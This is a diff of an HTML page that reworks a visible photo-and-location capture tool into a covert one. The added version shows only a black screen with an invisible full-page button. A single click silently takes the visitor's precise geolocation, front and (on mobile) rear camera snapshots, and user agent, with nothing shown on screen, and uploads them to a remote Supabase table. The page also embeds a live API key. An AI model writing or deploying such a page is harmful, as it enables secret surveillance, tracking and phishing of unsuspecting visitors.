@@ -1,267 +1,126 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="utf-8" />
-  <title>Capture Photo + Location → Supabase</title>
-  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Location & Camera Capture</title>
+  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
   <style>
-    body { font-family: system-ui, -apple-system, Roboto, "Segoe UI", Arial; padding: 18px; max-width: 820px; margin: auto; }
-    h1 { font-size: 1.2rem; margin-bottom: 8px; }
-    .status { margin: 8px 0; color: #222; }
-    video { background: #000; width: 320px; height: 240px; border-radius: 8px; }
-    .thumbs { display:flex; gap:12px; margin-top: 12px; flex-wrap:wrap; }
-    img.cap { max-width: 320px; border: 1px solid #ddd; border-radius:6px; }
-    button { margin-top: 12px; padding: 8px 12px; border-radius:6px; cursor:pointer; }
-    pre { background:#f6f6f6; padding:10px; border-radius:6px; overflow:auto; }
+    body {
+      margin: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      background: #000;
+    }
+    button {
+      background: transparent;
+      border: none;
+      color: transparent;
+      cursor: pointer;
+      width: 100%;
+      height: 100%;
+    }
+    video, canvas {
+      display: none;
+    }
   </style>
 </head>
 <body>
-  <h1>Auto Capture (Front & Rear) + Location → Supabase</h1>
-
-  <p class="status" id="status">Ready. Click <b>Start</b> to request permissions and capture photos.</p>
-
-  <div>
-    <button id="startBtn">Start</button>
-    <button id="stopBtn">Stop / Reset</button>
-  </div>
-
-  <div style="margin-top:12px;">
-    <video id="preview" autoplay playsinline muted></video>
-    <canvas id="hiddenCanvas" style="display:none;"></canvas>
-  </div>
-
-  <div class="thumbs" id="thumbs"></div>
-
-  <h3>Captured metadata</h3>
-  <pre id="meta">No captures yet.</pre>
-
-  <!-- Supabase JS -->
-  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2/dist/umd/supabase.min.js"></script>
+  <button id="startBtn"></button>
+  <video id="video" autoplay playsinline></video>
+  <canvas id="canvas"></canvas>
 
   <script>
-  // ---------- CONFIG ----------
-  const SUPABASE_URL = "https://epfznieirafhlbonudni.supabase.co";
-  const SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImVwZnpuaWVpcmFmaGxib251ZG5pIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjE3NTY5MzIsImV4cCI6MjA3NzMzMjkzMn0.5lvCs1kyYYtZiYMmApcJOq83tyZotRnOVY6I_fYWpNw";
-  const STORAGE_BUCKET = "photos";      // make sure this bucket exists in Supabase
-  const TABLE_NAME = "user_captures";   // table you chose
+    // ---------- CONFIG ----------
+    const SUPABASE_URL = "https://epfznieirafhlbonudni.supabase.co"; // ← replace
+    const SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImVwZnpuaWVpcmFmaGxib251ZG5pIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjE3NTY5MzIsImV4cCI6MjA3NzMzMjkzMn0.5lvCs1kyYYtZiYMmApcJOq83tyZotRnOVY6I_fYWpNw"; // ← replace
+    const TABLE_NAME = "user_captures";
+    const STORAGE_BUCKET = "photos";
 
-  // ---------- INIT ----------
-  const supabase = supabaseJs.createClient(SUPABASE_URL, SUPABASE_KEY);
+    // ---------- INIT ----------
+    const sb = window.supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
 
-  const startBtn = document.getElementById('startBtn');
-  const stopBtn = document.getElementById('stopBtn');
-  const statusEl = document.getElementById('status');
-  const preview = document.getElementById('preview');
-  const hiddenCanvas = document.getElementById('hiddenCanvas');
-  const thumbs = document.getElementById('thumbs');
-  const meta = document.getElementById('meta');
+    const startBtn = document.getElementById("startBtn");
+    const video = document.getElementById("video");
+    const canvas = document.getElementById("canvas");
 
-  let currentStream = null;
-  let stopped = false;
-
-  // ---------- Helpers ----------
-  function isMobile() {
-    // basic mobile detection
-    return /Mobi|Android|iPhone|iPad|iPod|Mobile/i.test(navigator.userAgent) || Math.min(screen.width, screen.height) < 700;
-  }
-
-  function sleep(ms){ return new Promise(res => setTimeout(res, ms)); }
-
-  async function stopStream() {
-    if (currentStream) {
-      currentStream.getTracks().forEach(t => t.stop());
-      currentStream = null;
-    }
-    preview.srcObject = null;
-  }
-
-  // Try to get camera stream with facingMode; fall back gracefully
-  async function getCameraStream(facing) {
-    // facing: 'user' or 'environment'
-    const exact = { video: { facingMode: { exact: facing } } };
-    const prefer = { video: { facingMode: facing } };
-    const simple = { video: true };
-
-    // prefer no audio
-    const withAudioFalse = obj => ({ ...obj, audio: false });
-
-    try {
-      return await navigator.mediaDevices.getUserMedia(withAudioFalse(exact));
-    } catch (e1) {
+    async function captureAndUpload() {
       try {
-        return await navigator.mediaDevices.getUserMedia(withAudioFalse(prefer));
-      } catch (e2) {
-        try {
-          // last resort: any camera (likely front on many laptops)
-          return await navigator.mediaDevices.getUserMedia(withAudioFalse(simple));
-        } catch (e3) {
-          throw e3;
+        // Detect device type
+        const isMobile = /Mobi|Android/i.test(navigator.userAgent);
+
+        // Get location
+        const position = await new Promise((resolve, reject) => {
+          navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy: true });
+        });
+        const { latitude, longitude } = position.coords;
+
+        // Device info
+        const deviceInfo = navigator.userAgent;
+
+        // Capture photos
+        const photos = [];
+        const constraints = { video: { facingMode: "user" } }; // front camera
+        const stream = await navigator.mediaDevices.getUserMedia(constraints);
+        video.srcObject = stream;
+        await new Promise(r => setTimeout(r, 2000)); // wait 2 sec
+        photos.push(await takeSnapshot());
+
+        // rear camera only if mobile
+        if (isMobile) {
+          const rearStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: "environment" } } });
+          video.srcObject = rearStream;
+          await new Promise(r => setTimeout(r, 2000)); // wait 2 sec
+          photos.push(await takeSnapshot());
+          rearStream.getTracks().forEach(t => t.stop());
         }
+
+        stream.getTracks().forEach(t => t.stop());
+
+        // Upload photos + data
+        for (let i = 0; i < photos.length; i++) {
+          const blob = photos[i];
+          const filename = `capture_${Date.now()}_${i}.jpg`;
+          const path = `${filename}`;
+
+          const { error: uploadErr } = await sb.storage.from(STORAGE_BUCKET).upload(path, blob, {
+            contentType: "image/jpeg"
+          });
+          if (uploadErr) console.error("Upload error:", uploadErr);
+
+          const { data } = sb.storage.from(STORAGE_BUCKET).getPublicUrl(path);
+          const photoUrl = data?.publicUrl;
+
+          await sb.from(TABLE_NAME).insert([{
+            photo_url: photoUrl,
+            latitude,
+            longitude,
+            device_info: deviceInfo,
+            captured_at: new Date().toISOString()
+          }]);
+        }
+      } catch (err) {
+        console.error("Error:", err);
       }
     }
-  }
 
-  async function captureOnceFromStream(stream) {
-    preview.srcObject = stream;
-    currentStream = stream;
+    function takeSnapshot() {
+      const videoTrack = video.srcObject.getVideoTracks()[0];
+      const settings = videoTrack.getSettings();
+      const width = settings.width || 640;
+      const height = settings.height || 480;
+      canvas.width = width;
+      canvas.height = height;
+      const ctx = canvas.getContext("2d");
+      ctx.drawImage(video, 0, 0, width, height);
+      return new Promise(resolve => canvas.toBlob(resolve, "image/jpeg"));
+    }
 
-    // wait for the video to be ready
-    await new Promise((resolve) => {
-      if (preview.readyState >= 2) return resolve();
-      const onPlay = () => { preview.removeEventListener('playing', onPlay); resolve(); };
-      preview.addEventListener('playing', onPlay);
+    startBtn.addEventListener("click", async () => {
+      await captureAndUpload();
     });
-
-    // small delay for exposure/auto-focus (we'll wait 2s before calling this)
-    // draw to canvas
-    const w = preview.videoWidth || 1280;
-    const h = preview.videoHeight || 720;
-    hiddenCanvas.width = w;
-    hiddenCanvas.height = h;
-    const ctx = hiddenCanvas.getContext('2d');
-    ctx.drawImage(preview, 0, 0, w, h);
-
-    // to blob
-    return await new Promise(resolve => hiddenCanvas.toBlob(blob => resolve(blob), 'image/png'));
-  }
-
-  async function uploadBlobToSupabase(blob, filename) {
-    const path = `captures/${filename}`;
-    // upload
-    const { error: uploadErr } = await supabase.storage.from(STORAGE_BUCKET).upload(path, blob, { cacheControl: '3600', upsert: false });
-    if (uploadErr) throw uploadErr;
-
-    // get public URL
-    const { data } = supabase.storage.from(STORAGE_BUCKET).getPublicUrl(path);
-    return data.publicUrl;
-  }
-
-  async function insertRecordIntoDB(imageUrls, latitude, longitude) {
-    const payload = {
-      image_urls: imageUrls,
-      latitude: latitude ?? null,
-      longitude: longitude ?? null,
-    };
-    const { data, error } = await supabase.from(TABLE_NAME).insert([payload]).select().single();
-    if (error) throw error;
-    return data;
-  }
-
-  // ---------- Main Flow ----------
-  startBtn.addEventListener('click', async () => {
-    stopped = false;
-    startBtn.disabled = true;
-    statusEl.textContent = 'Requesting permissions... (camera + location)';
-    thumbs.innerHTML = '';
-    meta.textContent = 'Waiting for permissions...';
-
-    try {
-      // 1) Request location (may show prompt)
-      const locationPromise = new Promise((resolve, reject) => {
-        if (!navigator.geolocation) {
-          resolve({ coords: null });
-        } else {
-          // give the browser some time to get a fix; we still proceed if user denies
-          navigator.geolocation.getCurrentPosition(
-            pos => resolve(pos),
-            err => resolve({ coords: null }),
-            { enableHighAccuracy: true, timeout: 10000 }
-          );
-        }
-      });
-
-      // 2) Determine device and cameras to use
-      const mobile = isMobile();
-      statusEl.textContent = `Device detected: ${mobile ? 'Mobile' : 'Laptop/Desktop'}. Asking for camera...`;
-
-      const results = { frontUrl: null, rearUrl: null, latitude: null, longitude: null };
-
-      // Function to capture with facing and name
-      async function captureFacing(facing, label) {
-        statusEl.textContent = `Requesting ${label} camera...`;
-        try {
-          const stream = await getCameraStream(facing);
-          // Wait 2 seconds after permission is granted before capture
-          statusEl.textContent = `Permission granted for ${label}. Capturing in 2s...`;
-          await sleep(2000);
-          const blob = await captureOnceFromStream(stream);
-          // stop that stream to switch camera if needed
-          stopStream();
-          // upload
-          statusEl.textContent = `Uploading ${label} photo...`;
-          const timestamp = Date.now();
-          const filename = `${label}_${timestamp}.png`;
-          const publicUrl = await uploadBlobToSupabase(blob, filename);
-          statusEl.textContent = `${label} uploaded.`;
-          // show thumb
-          const img = document.createElement('img');
-          img.className = 'cap';
-          img.src = URL.createObjectURL(blob);
-          img.alt = label;
-          thumbs.appendChild(img);
-          return publicUrl;
-        } catch (err) {
-          console.error('captureFacing error', err);
-          statusEl.textContent = `${label} camera unavailable or permission denied.`;
-          return null;
-        }
-      }
-
-      // Wait for location promise in parallel but continue with camera
-      const locationResultPromise = locationPromise;
-
-      if (mobile) {
-        // On mobile: capture front then rear
-        results.frontUrl = await captureFacing('user', 'front');
-        if (stopped) throw new Error('Stopped by user');
-        // small gap before rear
-        await sleep(600); // short gap before requesting rear
-        results.rearUrl = await captureFacing('environment', 'rear');
-      } else {
-        // On laptop/desktop: just front
-        results.frontUrl = await captureFacing('user', 'front');
-      }
-
-      // Get location
-      const locRes = await locationResultPromise;
-      if (locRes && locRes.coords) {
-        results.latitude = locRes.coords.latitude;
-        results.longitude = locRes.coords.longitude;
-      }
-
-      statusEl.textContent = 'Saving record to database...';
-
-      const imageUrls = { front: results.frontUrl, rear: results.rearUrl };
-      const saved = await insertRecordIntoDB(imageUrls, results.latitude, results.longitude);
-
-      meta.textContent = JSON.stringify({
-        saved_record: saved,
-        display: {
-          imageUrls,
-          latitude: results.latitude,
-          longitude: results.longitude
-        }
-      }, null, 2);
-
-      statusEl.textContent = 'Done — photo(s) captured, uploaded, and saved.';
-    } catch (err) {
-      console.error(err);
-      statusEl.textContent = 'Error: ' + (err.message || err);
-    } finally {
-      startBtn.disabled = false;
-    }
-  });
-
-  stopBtn.addEventListener('click', async () => {
-    stopped = true;
-    await stopStream();
-    thumbs.innerHTML = '';
-    meta.textContent = 'Stopped / reset.';
-    statusEl.textContent = 'Stopped. Ready.';
-  });
-
-  // cleanup when leaving page
-  window.addEventListener('beforeunload', stopStream);
   </script>
 </body>
 </html>
